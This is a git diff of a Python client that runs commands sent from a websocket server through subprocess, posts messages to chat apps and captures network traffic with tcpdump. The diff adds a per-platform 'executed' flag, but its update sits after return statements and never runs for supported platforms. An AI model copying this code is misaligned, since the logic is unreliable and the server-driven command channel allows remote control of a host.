@@ -3,7 +3,7 @@ import websockets
 import json
 import uuid
 import subprocess
-import shlex
+import json as JSON
 from client.commands.discord import send_discord_message
 from client.commands.messenger import send_messenger_message
 from client.commands.signal import send_signal_message
@@ -14,6 +14,16 @@ from client.commands.telegram import send_telegram_message
 from client.commands.whatsapp import send_whatsapp_message
 from client.collectors.tcp.tcp_dump_manager import TcpDumpManager
 from client.collectors.ports.network_stats_collector import NetworkStatsCollector
+
+EXECUTED_LIST = {
+    'discord': False,
+    'messenger': False,
+    'signal': False,
+    'skype': False,
+    'slack': False,
+    'teams': False,
+    'telegram': False,
+    'whatsapp': False}
 
 async def connect_to_server(device_id, port_collector, tcpdump_manager):
     try:
@@ -58,8 +68,9 @@ async def execute_command(command):
     except subprocess.CalledProcessError as e:
         return {"status": "failure", "error": str(e), "output": e.stderr}
 
-def post_message_to_the_chat(message, platform, executed=False):
+def post_message_to_the_chat(message, platform):
     """ Sends a message to the specified platform's chat. """
+    executed = EXECUTED_LIST[platform]
     if platform == 'discord':
         return send_discord_message(message, executed)
     elif platform == 'messenger':
@@ -78,13 +89,14 @@ def post_message_to_the_chat(message, platform, executed=False):
         return send_whatsapp_message(message, executed)
     else:
         print("Unsupported platform")
+    EXECUTED_LIST[platform] = True
 
 def stop_collectors(port_collector, tcpdump_manager):
     """ Stop the network statistics collector and tcpdump manager. """
     port_collector.stop()  # Stops the NetworkStatsCollector
     tcpdump_manager.stop_tcpdump()  # Stops the TcpDumpManager
 
-if _name_ == "_main_":
+if __name__ == "__main__":
     print("Starting client")
     device_id = str(uuid.uuid4())
     port_collector = NetworkStatsCollector()
